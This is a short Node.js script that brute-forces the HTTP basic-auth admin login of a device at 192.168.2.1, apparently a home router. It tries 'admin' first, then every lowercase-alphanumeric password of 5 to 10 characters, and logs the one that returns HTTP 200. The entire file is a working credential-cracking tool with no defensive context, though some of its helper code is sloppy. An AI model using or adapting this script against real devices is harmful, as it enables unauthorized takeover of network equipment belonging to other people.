var http = require('http'),
	fs = require('fs'),
	result = {};

var option = {
	host: '192.168.2.1',
	port: 80,
	path: '/',
	method: 'GET',
	imgTimeout: 10000,
	count: 0
};

var word = '0123456789abcdefghijklmnopqrstuvwxyz';
// var word = 'admin'; 
http.globalAgent.maxSockets = 1;

function crack (pwd) {
	option.auth = 'admin:' + pwd;
	http.get(option, function (res) {
		res.on('data', function () {
			if(res.statusCode == '200'){
				console.log('Done password is ' + pwd);
			}
			else{
				console.log('Not ' + pwd);
			}
			res.destroy();
		});
	}).on('error', function(e) {
		// console.log('error retry');
		// crack(pwd)
	}).setTimeout(option.imgTimeout, function(){
		status = 'timeout';
		this.socket.destroy();
	});
}

function setWord (min, max, word, callback) {
	var initArray = [];
		initArray.length = min;
		initArray.forEach(function (t) {
			t = word[0];
		});


	for (var i = min; i <= max; i++) {		
		wordRecursion(initArray, word, callback);
		initArray.push(word[0]);
	}
}

function wordRecursion (arr, word, callback, index) {
	index = index || 0;
	word.forEach(function (t) {
		arr[index] = t;
		if (index < arr.length - 1) {
			wordRecursion(arr, word, callback, index + 1);
			return true;
		}
		callback && callback(arr);
	});
}

crack('admin');

setWord(5, 10, word.split(''), function (data) {
	// console.log(++option.count, data.join(''));
	crack(data.join(''));
});


// wordRecursion(['0', '0'], word.split(''))